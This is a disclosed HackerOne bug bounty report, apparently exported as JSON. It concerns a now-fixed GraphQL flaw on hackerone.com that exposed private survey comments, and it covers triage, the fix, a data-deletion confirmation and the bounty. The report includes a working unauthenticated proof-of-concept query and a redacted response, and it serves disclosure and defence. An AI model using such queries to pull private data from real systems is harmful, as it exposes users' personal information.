{"id":978143,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85NzgxNDM=","url":"https://hackerone.com/reports/978143","title":"Team object in GraphQL disclosed private_comment","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2020-09-10T04:48:00.513Z","submitted_at":"2020-09-10T04:48:00.526Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"haxta4ok00","url":"/haxta4ok00","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/049/175/8449afdd3403f4de00b34719ee09823bad1c0a06_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":13,"url":"https://hackerone.com/security","handle":"security","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"HackerOne","twitter_handle":"Hacker0x01","website":"https://hackerone.com","about":"Vulnerability disclosure should be safe, transparent, and rewarding."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-09-10T19:05:03.223Z","bug_reporter_agreed_on_going_public_at":"2020-09-10T19:05:03.118Z","team_member_agreed_on_going_public_at":"2020-09-10T19:02:46.609Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"**Summary:**\nHi Team, Some private(I think) part of GraphQL reveals to us\n\n### Steps To Reproduce\nWithout authorization\n\n1. https://hackerone.com/graphql \n\nPOST:\n\n`{\"query\":\"query { node(id: \\\\\"gid://hackerone/SurveyRatingItem/█████\\\\\") { ... on SurveyRatingItem{_id,pentester{_id},team{_id},key,private_comment,public_comment,rating,recipient{username,email},subject{... on Report{_id}},survey_rating{_id,team{_id},state,respondent{_id,username,email,pentests{nodes{_id}}}}}}}\",\"variables\":{}}`\n\n`{\"data\":{\"node\":{\"_id\":\"████████\",\"pentester\":null,\"team\":null,\"key\":\"scope\",\"private_comment\":\"████\",\"public_comment\":null,\"rating\":1,\"recipient\":null,\"subject\":null,\"survey_rating\":{\"_id\":\"█████\",\"team\":null,\"state\":\"completed\",\"respondent\":{\"_id\":\"████\",\"username\":\"███\",\"email\":null,\"pentests\":{\"nodes\":[]}}}}}}`\n\nAs we can see, the `key` field takes the value `scope`, we don't see in which program this happens, but we can see the comments of the participant, and as we can see, it has the status private\n\nPS. Yes, we do not see some data, but in the future they may be disclosed in the comments (I think so)\n\n## Impact\n\ndisclosed private_comment","bounty_amount":"2500.0","formatted_bounty":"$2,500","weakness":{"id":18,"name":"Information Disclosure"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2020-10-10T19:02:46.767Z","allow_singular_disclosure_after":-31610702.89050048,"singular_disclosure_allowed":true,"vote_count":138,"voters":["superpan","y0u3nd","xdms","thaivu","xploiterr","mashoud1122","zonduu","excavator","hunter","ex1st3nc3_","and 128 more..."],"severity":{"rating":"medium","score":5.0,"author_type":"Team","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"required","scope":"unchanged","confidentiality":"low","integrity":"none","availability":"none"}},"structured_scope":{"databaseId":3,"asset_type":"URL","asset_identifier":"https://hackerone.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":9178394,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I counted how many private comments I see, and there were 136 of them. I believe that every private comment has a high value because it can carry any personal information between resopndent and recipient, Also, I am sure that there are many more of them, but their number will increase from those people who are already visible(for reasons I don't understand). \n\n Also (I think so) we disclose those who are pentesters on the platform, even if they are not here - https://hackerone.com/directory/pentesters , via `\"key\":\"pentester\"`.\n\nI will attach two files where you will find all the visible SurveyRatingItem IDS+","automated_response":false,"created_at":"2020-09-10T09:46:21.676Z","updated_at":"2020-09-10T09:46:21.676Z","actor":{"username":"haxta4ok00","cleared":true,"url":"/haxta4ok00","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/049/175/8449afdd3403f4de00b34719ee09823bad1c0a06_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9178400,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2020-09-10T09:47:11.029Z","updated_at":"2020-09-10T09:47:11.029Z","additional_data":{"old_severity":null,"new_severity":"High (7.7)","old_severity_id":null,"new_severity_id":841884},"actor":{"username":"haxta4ok00","cleared":true,"url":"/haxta4ok00","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/049/175/8449afdd3403f4de00b34719ee09823bad1c0a06_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9178735,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @haxta4ok00,\n\nThank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.\n\nKind regards,\n@ktistai","automated_response":false,"created_at":"2020-09-10T10:24:07.544Z","updated_at":"2020-09-10T10:24:07.544Z","actor":{"username":"ktistai","cleared":false,"url":"/ktistai","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/322/520/01cd21dce301646646276fd9125cffd448fbffd6_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9181065,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Nice one, thanks @haxta4ok00! We haven't determined the exact severity yet, we'll do that shortly.","automated_response":false,"created_at":"2020-09-10T14:56:58.795Z","updated_at":"2020-09-10T14:56:58.795Z","actor":{"username":"jobert","cleared":true,"url":"/jobert","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9181067,"is_internal":false,"editable":false,"type":"Activities::BugRetesting","message":"We deployed a fix, would you mind retesting this, @haxta4ok00? Thanks!","automated_response":false,"created_at":"2020-09-10T14:57:19.551Z","updated_at":"2020-09-10T14:57:19.813Z","actor":{"username":"jobert","cleared":true,"url":"/jobert","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","report_retest":{"id":2212,"retest_subscription":{"handled_by_triage":false}},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9181135,"is_internal":false,"editable":false,"type":"Activities::UserCompletedRetest","message":"Hey @jobert -- I checked some of the queries and it seems that this is fixed","automated_response":false,"created_at":"2020-09-10T15:06:22.254Z","updated_at":"2020-09-10T15:06:22.254Z","actor":{"username":"haxta4ok00","cleared":true,"url":"/haxta4ok00","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/049/175/8449afdd3403f4de00b34719ee09823bad1c0a06_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9182565,"is_internal":false,"editable":false,"type":"Activities::ReportRetestApproved","message":"Thanks for confirming, @haxta4ok00!","automated_response":false,"created_at":"2020-09-10T17:53:16.071Z","updated_at":"2020-09-11T11:07:46.872Z","actor":{"url":"/security","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"HackerOne"}},"genius_execution_id":null,"team_handle":"security","report_retest_user":{"user":{"username":"haxta4ok00"},"report_retest":{"retest_subscription":{"tag":"new","handled_by_triage":false,"awarding_retesters":true}}},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9182566,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","automated_response":false,"created_at":"2020-09-10T17:53:16.244Z","updated_at":"2020-09-10T17:53:16.244Z","actor":{"username":"jobert","cleared":true,"url":"/jobert","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"reporter":{"username":"haxta4ok00","url":"/haxta4ok00"},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9182580,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @haxta4ok00 - we've looked at our logs and noticed that in your testing you may have accessed private comments from a few other users. Can you confirm that you've deleted all copies of this information? Thanks!","automated_response":false,"created_at":"2020-09-10T17:54:54.125Z","updated_at":"2020-09-10T17:54:54.125Z","actor":{"username":"jobert","cleared":true,"url":"/jobert","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9182619,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @jobert -- Yes, I confirm that right now I have deleted all the files that were created during this report.","automated_response":false,"created_at":"2020-09-10T18:01:10.803Z","updated_at":"2020-09-10T18:01:10.803Z","actor":{"username":"haxta4ok00","cleared":true,"url":"/haxta4ok00","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/049/175/8449afdd3403f4de00b34719ee09823bad1c0a06_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9182801,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2020-09-10T18:25:26.571Z","updated_at":"2020-09-10T18:25:26.571Z","additional_data":{"old_severity":"High (7.7)","new_severity":"Medium (5.0)","old_severity_id":841884,"new_severity_id":842263},"actor":{"username":"jobert","cleared":true,"url":"/jobert","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9182830,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Hi @haxta4ok00 - due to the nature of the information that was exposed, we believe the impact on confidentiality was low instead of high. We also thought that the attack complexity was low, instead of high (what you initially tagged it as). This brought the severity to a medium, so we're awarding you with a $2,500 bounty!\n\nThanks again for bringing this to our attention, this was a great find!","automated_response":false,"created_at":"2020-09-10T18:33:34.360Z","updated_at":"2020-09-10T18:33:34.360Z","actor":{"url":"/security","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"HackerOne"}},"bounty_amount":"2500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"security","collaborator":{"username":"haxta4ok00","url":"/haxta4ok00"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9182841,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @jobert -- Thanks for the bounty!","automated_response":false,"created_at":"2020-09-10T18:36:20.189Z","updated_at":"2020-09-10T18:36:20.189Z","actor":{"username":"haxta4ok00","cleared":true,"url":"/haxta4ok00","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/049/175/8449afdd3403f4de00b34719ee09823bad1c0a06_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9183017,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-09-10T19:02:46.640Z","updated_at":"2020-09-10T19:02:46.640Z","first_to_agree":true,"actor":{"username":"jobert","cleared":true,"url":"/jobert","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9183032,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-09-10T19:05:03.152Z","updated_at":"2020-09-10T19:05:03.152Z","actor":{"username":"haxta4ok00","cleared":true,"url":"/haxta4ok00","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/049/175/8449afdd3403f4de00b34719ee09823bad1c0a06_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9183033,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2020-09-10T19:05:03.270Z","updated_at":"2020-09-10T19:05:03.270Z","actor":{"username":"haxta4ok00","cleared":true,"url":"/haxta4ok00","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/049/175/8449afdd3403f4de00b34719ee09823bad1c0a06_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}